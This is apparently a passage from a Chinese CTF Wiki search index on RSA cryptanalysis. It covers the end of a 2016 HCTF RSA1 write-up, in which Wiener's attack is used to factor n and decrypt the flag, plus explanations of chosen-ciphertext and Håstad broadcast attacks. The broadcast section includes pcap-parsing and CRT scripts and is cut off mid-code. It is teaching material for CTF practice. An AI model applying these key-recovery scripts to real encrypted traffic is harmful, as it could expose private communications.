\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u5f97\u5230\u7684 u \u7684\u4f4d\u6570\u6bd4 n \u7684\u4f4d\u6570\u7684\u56db\u5206\u4e4b\u4e00\u8fd8\u8981\u5c11\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u5dee\u4e0d\u591a\u6ee1\u8db3\u4e86 Wiener's Attack \u4e86\u3002\u800c\u4e14\u6211\u4eec\u8ba1\u7b97\u51fa\u6765\u7684 u\uff0ct\uff0ce\uff0cd \u8fd8\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6   \n\\begin{align*}\nut  \\equiv 1  \\bmod \\varphi(n) \\\\\net  \\equiv 1 \\bmod bt \\\\\ned  \\equiv 1 \\bmod \\varphi(n)\n\\end{align*}  \n\\begin{align*}\nut &\\equiv 1  \\bmod \\varphi(n) \\\\\net &\\equiv 1 \\bmod bt \\\\\ned &\\equiv 1 \\bmod \\varphi(n)\n\\end{align*}   \u6839\u636e\u9898\u4e2d\u7ed9\u51fa\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 n\uff0ce\uff0cbt\u3002  \u6240\u4ee5\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u7b2c\u4e8c\u4e2a\u5f0f\u5b50\u77e5\u9053 e\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u4e2a\u5f0f\u5b50\u8fdb\u884c Wiener's Attack\uff0c\u83b7\u53d6 u\u3002\u8fdb\u800c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u79c1\u94a5\u6307\u6570\u6cc4\u9732\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u5206\u89e3 N \u4ece\u800c\u5f97\u5230 p\uff0cq\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230 d \u4e86\u3002  \u9996\u5148\u6211\u4eec\u7ed5\u8fc7 proof \u5f97\u5230\u4e86 N\uff0ce\uff0c\u52a0\u5bc6\u540e\u7684 flag \u5982\u4e0b  n:  0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\ne:  0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1\nflag:  0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df  \u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u8fdb\u884c Wiener's Attack \u5f97\u5230 u\uff0c\u5982\u4e0b  if   __name__   ==   __main__ : \n     bt   =   536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L \n     e   =   0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 \n     t   =   gmpy2 . invert ( e ,   bt ) \n     n   =   0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 \n     solve ( n ,   t )   \u5176\u4e2d solve \u51fd\u6570\u5c31\u662f\u5bf9\u5e94\u7684 Wiener's Attack \u7684\u51fd\u6570\u3002  \u6211\u4eec\u5f97\u5230\u4e86 u\uff0c\u5982\u4e0b  \u279c  rsa-wiener-attack git: ( master )  \u2717 python RSAwienerHacker.py\nTesting Wiener Attack\nHacked! ( hacked_d =  , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) \n-------------------------\nHacked! ( hacked_d =  , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) \n-------------------------\nHacked! ( hacked_d =  , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) \n-------------------------\nHacked! ( hacked_d =  , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) \n-------------------------\nHacked! ( hacked_d =  , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L ))   \u63a5\u7740\u5229\u7528 RsaConverter \u4ee5\u53ca u\uff0ct\uff0cn \u83b7\u53d6\u5bf9\u5e94\u7684 p \u548c q\u3002\u5982\u4e0b  94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1  \u7136\u540e\u6211\u4eec\u76f4\u63a5\u53bb\u83b7\u5f97 d\uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u6062\u590d\u660e\u6587       p   =   0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 \n     q   =   0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 \n     if   p   *   q   ==   n : \n         print   true \n     phin   =   ( p   -   1 )   *   ( q   -   1 ) \n     d   =   gmpy2 . invert ( e ,   phin ) \n     cipher   =   0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df \n     flag   =   gmpy2 . powmod ( cipher ,   d ,   n ) \n     print   long_to_bytes ( flag )   \u5f97\u5230 flag  true \nhctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }", 
            "title": "2016 HCTF RSA1"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_chosen_cipher/", 
            "text": "\u539f\u7406\n\n\n\u5047\u8bbe\u7231\u4e3d\u4e1d\u521b\u5efa\u4e86\u5bc6\u6587 \nC = P^e \\bmod n\nC = P^e \\bmod n\n \u5e76\u4e14\u628a C \u53d1\u9001\u7ed9\u9c8d\u52c3\uff0c\u540c\u65f6\u5047\u8bbe\u6211\u4eec\u8981\u5bf9\u7231\u4e3d\u4e1d\u52a0\u5bc6\u540e\u7684\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6\uff0c\u800c\u4e0d\u662f\u53ea\u89e3\u5bc6 C\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u62e6\u622a C\uff0c\u5e76\u8fd0\u7528\u4e0b\u5217\u6b65\u9aa4\u6c42\u51fa P\uff1a\n\n\n\n\n\u9009\u62e9\u4efb\u610f\u7684 \nX\\in Z_n^{*}\nX\\in Z_n^{*}\n\uff0c\u5373 X \u4e0e N \u4e92\u7d20\n\n\n\u8ba1\u7b97 \nY=C \\times X^e \\bmod n\nY=C \\times X^e \\bmod n\n \n\n\n\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u90a3\u4e48\u6211\u4eec\u6c42\u5f97 Y \u5bf9\u5e94\u7684\u89e3\u5bc6\u7ed3\u679c \nZ=Y^d\nZ=Y^d\n\n\n\u90a3\u4e48\uff0c\u7531\u4e8e \nZ=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n\nZ=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n\n\uff0c\u7531\u4e8e X \u4e0e N \u4e92\u7d20\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6c42\u5f97\u76f8\u5e94\u7684\u9006\u5143\uff0c\u8fdb\u800c\u53ef\u4ee5\u5f97\u5230 P", 
            "title": "\u9009\u62e9\u5bc6\u6587\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_chosen_cipher/#_1", 
            "text": "\u5047\u8bbe\u7231\u4e3d\u4e1d\u521b\u5efa\u4e86\u5bc6\u6587  C = P^e \\bmod n C = P^e \\bmod n  \u5e76\u4e14\u628a C \u53d1\u9001\u7ed9\u9c8d\u52c3\uff0c\u540c\u65f6\u5047\u8bbe\u6211\u4eec\u8981\u5bf9\u7231\u4e3d\u4e1d\u52a0\u5bc6\u540e\u7684\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6\uff0c\u800c\u4e0d\u662f\u53ea\u89e3\u5bc6 C\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u62e6\u622a C\uff0c\u5e76\u8fd0\u7528\u4e0b\u5217\u6b65\u9aa4\u6c42\u51fa P\uff1a   \u9009\u62e9\u4efb\u610f\u7684  X\\in Z_n^{*} X\\in Z_n^{*} \uff0c\u5373 X \u4e0e N \u4e92\u7d20  \u8ba1\u7b97  Y=C \\times X^e \\bmod n Y=C \\times X^e \\bmod n    \u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u90a3\u4e48\u6211\u4eec\u6c42\u5f97 Y \u5bf9\u5e94\u7684\u89e3\u5bc6\u7ed3\u679c  Z=Y^d Z=Y^d  \u90a3\u4e48\uff0c\u7531\u4e8e  Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n \uff0c\u7531\u4e8e X \u4e0e N \u4e92\u7d20\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6c42\u5f97\u76f8\u5e94\u7684\u9006\u5143\uff0c\u8fdb\u800c\u53ef\u4ee5\u5f97\u5230 P", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/", 
            "text": "Coppersmith \u76f8\u5173\u653b\u51fb\n\n\n\u57fa\u672c\u539f\u7406\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b \nCoppersmith method\n \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7531 \nDon Coppersmith\n \u63d0\u51fa\uff0c\u53ef\u4ee5\u7528\u6765\u627e\u5230\u5355\u53d8\u91cf\u6216\u8005\u4e8c\u5143\u53d8\u91cf\u7684\u591a\u9879\u5f0f\u5728\u6a21\u67d0\u4e2a\u6574\u6570\u4e0b\u7684\u6839\uff0c\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5\u5355\u53d8\u91cf\u4e3a\u4e3b\uff0c\u5047\u8bbe\u6211\u4eec\u6709\u5982\u4e0b\u7684\u4e00\u4e2a\u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u591a\u9879\u5f0f F\n\n\n\n\n\nF(x)=x^n + a_{n-1} x^{n-1} + \\cdots + a_1x + a_0\n\n\n\n\nF(x)=x^n + a_{n-1} x^{n-1} + \\cdots + a_1x + a_0\n\n\n\n\n\n\u5047\u8bbe\u8be5\u591a\u9879\u5f0f\u5728\u6a21 N \u610f\u4e49\u4e0b\u6709\u4e00\u4e2a\u6839 \nx_0\nx_0\n\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee4 \nx_0 \n M^{\\frac{1}{n}}\nx_0 < M^{\\frac{1}{n}}\n\u3002\u5982\u679c\u7b49\u53f7\u6210\u7acb\u7684\u8bdd\uff0c\u663e\u7136\u53ea\u6709 \nx^n\nx^n\n \u8fd9\u4e00\u9879\uff0c\u90a3 0 \u5c31\u662f\uff0c\u4e5f\u6ee1\u8db3\u3002\n\n\nCoppersmith method\n \u4e3b\u8981\u662f\u901a\u8fc7 \nLenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm\n\uff08LLL\uff09\u65b9\u6cd5\u6765\u627e\u5230\u4e0e\u8be5\u51fd\u6570\u5177\u6709\u76f8\u540c\u6839 \nx_0\nx_0\n \u4f46\u6709\u66f4\u5c0f\u7cfb\u6570\u7684\u591a\u9879\u5f0f\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002\n\n\nBasic Broadcast Attack\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe e \u4e3a 3\uff0c\u5e76\u4e14\u52a0\u5bc6\u8005\u4f7f\u7528\u4e86\u4e09\u4e2a\u4e0d\u540c\u7684\u6a21\u6570 \nn_1,n_2,n_3\nn_1,n_2,n_3\n \u7ed9\u4e09\u4e2a\u4e0d\u540c\u7684\u7528\u6237\u53d1\u9001\u4e86\u52a0\u5bc6\u540e\u7684\u6d88\u606f m\uff0c\u5982\u4e0b\n\n\n\n\n\n\\begin{align*}\nc_1\n=m^3\\bmod n_1 \\\\\nc_2\n=m^3\\bmod n_2 \\\\\nc_3\n=m^3\\bmod n_3\n\\end{align*}\n\n\n\n\n\\begin{align*}\nc_1&=m^3\\bmod n_1 \\\\\nc_2&=m^3\\bmod n_2 \\\\\nc_3&=m^3\\bmod n_3\n\\end{align*}\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe \nn_1,n_2,n_3\u200b\nn_1,n_2,n_3\u200b\n \u4e92\u7d20\uff0c\u4e0d\u7136\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u89e3\uff0c\u7136\u540e\u5f97\u5230 d\uff0c\u8fdb\u800c\u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u3002\n\n\n\u540c\u65f6\uff0c\u6211\u4eec\u5047\u8bbe \nm\nn_i, 1\\leq i \\leq 3\nm<n_i, 1\\leq i \\leq 3\n\u3002\u5982\u679c\u8fd9\u4e2a\u6761\u4ef6\u4e0d\u6ee1\u8db3\u7684\u8bdd\uff0c\u5c31\u4f1a\u4f7f\u5f97\u60c5\u51b5\u53d8\u5f97\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u6211\u4eec\u6682\u4e0d\u8ba8\u8bba\u3002\n\n\n\u65e2\u7136\u4ed6\u4eec\u4e92\u7d20\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff0c\u53ef\u5f97\nm^3 \\equiv C \\bmod n_1n_2n_3\nm^3 \\equiv C \\bmod n_1n_2n_3\n\u3002\n\n\n\u6b64\u5916\uff0c\u65e2\u7136 \nm\nn_i, 1\\leq i \\leq 3\nm<n_i, 1\\leq i \\leq 3\n\uff0c\u90a3\u4e48\u6211\u4eec\u77e5\u9053 \nm^3 \n n_1n_2n_3\nm^3 < n_1n_2n_3\n \u5e76\u4e14 \nC\nm^3 \n n_1n_2n_3\nC<m^3 < n_1n_2n_3\n\uff0c\u90a3\u4e48 \nm^3 = C\nm^3 = C\n\uff0c\u6211\u4eec\u5bf9 C \u5f00\u4e09\u6b21\u6839\u5373\u53ef\u5f97\u5230 m \u7684\u503c\u3002\n\n\n\u5bf9\u4e8e\u8f83\u5927\u7684 e \u6765\u8bf4\uff0c\u6211\u4eec\u53ea\u662f\u9700\u8981\u66f4\u591a\u7684\u660e\u5bc6\u6587\u5bf9\u3002\n\n\nSCTF RSA3 LEVEL4\n\n\n\u53c2\u8003 \nhttp://ohroot.com/2016/07/11/rsa-in-ctf\n\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level4 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u7f16\u5199\u4ee3\u7801\u63d0\u53d6 cap \u5305\u4e2d\u7684\u6570\u636e\uff0c\u5982\u4e0b\n\n\n#!/usr/bin/env python\n\n\nfrom scapy.all import *\nimport zlib\nimport struct\n\n\nPA\n \n=\n \n24\n\n\npackets\n \n=\n rdpcap\n(\n./syc_security_system_traffic3.pcap\n)\n\n\nclient\n \n=\n \n192.168.1.180\n\n\nlist_n\n \n=\n \n[]\n\n\nlist_m\n \n=\n \n[]\n\n\nlist_id\n \n=\n \n[]\n\n\ndata\n \n=\n \n[]\n\n\nfor\n packet in packets:\n    \n# TCP Flag PA 24 means carry data\n\n    \nif\n packet\n[\nTCP\n]\n.flags \n==\n PA or packet\n[\nTCP\n]\n.flags \n==\n PA + \n1\n:\n        \nsrc\n \n=\n packet\n[\nIP\n]\n.src\n        \nraw_data\n \n=\n packet\n[\nTCP\n]\n.load\n        \nhead\n \n=\n raw_data.strip\n()[\n:7\n]\n\n        \nif\n \nhead\n \n==\n \nWe have\n:\n            n, \ne\n \n=\n raw_data.strip\n()\n.replace\n(\nWe have got N is \n,\n                                            \n)\n.split\n(\n\\ne is \n)\n\n            data.append\n(\nn.strip\n())\n\n        \nif\n \nhead\n \n==\n \nencrypt\n:\n            \nm\n \n=\n raw_data.replace\n(\nencrypted messages is 0x\n, \n)\n.strip\n()\n\n            data.append\n(\nstr\n(\nint\n(\nm, \n16\n)))\n\n\nwith open\n(\n./data.txt\n, \nw\n)\n as f:\n    \nfor\n i in range\n(\n0\n, len\n(\ndata\n)\n, \n2\n)\n:\n        \ntmp\n \n=\n \n,\n.join\n(\ns \nfor\n s in data\n[\ni:i + \n2\n])\n\n        f.write\n(\ntmp + \n\\n\n)\n\n\n\n\n\n\u5176\u6b21\uff0c\u5229\u7528\u5f97\u5230\u7684\u6570\u636e\u76f4\u63a5\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002\n\n\nfrom\n \nfunctools\n \nimport\n \nreduce\n\n\nimport\n \ngmpy\n\n\nimport\n \njson\n,\n \nbinascii\n\n\n\n\ndef\n \nmodinv\n(\na\n,\n \nm\n):\n\n    \nreturn\n \nint\n(\ngmpy\n.\ninvert\n(\ngmpy\n.\nmpz\n(\na\n),\n \ngmpy\n.\nmpz\n(\nm\n)))\n\n\n\n\ndef\n \nchinese_remainder\n(\nn\n,\n \na\n):\n\n    \nsum\n \n=\n \n0\n\n    \nprod\n \n=\n \nreduce\n(\nlambda\n \na\n,\n \nb\n:\n \na\n \n*\n \nb\n,\n \nn\n)\n\n    \n# \u5e76\u884c\u8fd0\u7b97\n\n    \nfor\n \nn_i\n,\n \na_i\n \nin\n \nzip\n(\nn\n,\n \na\n):\n\n        \np\n \n=\n \nprod\n \n//\n \nn_i\n\n        \nsum\n \n+=\n \na_i\n \n*\n \nmodinv\n(\np\n,\n \nn_i\n)\n \n*\n \np\n\n    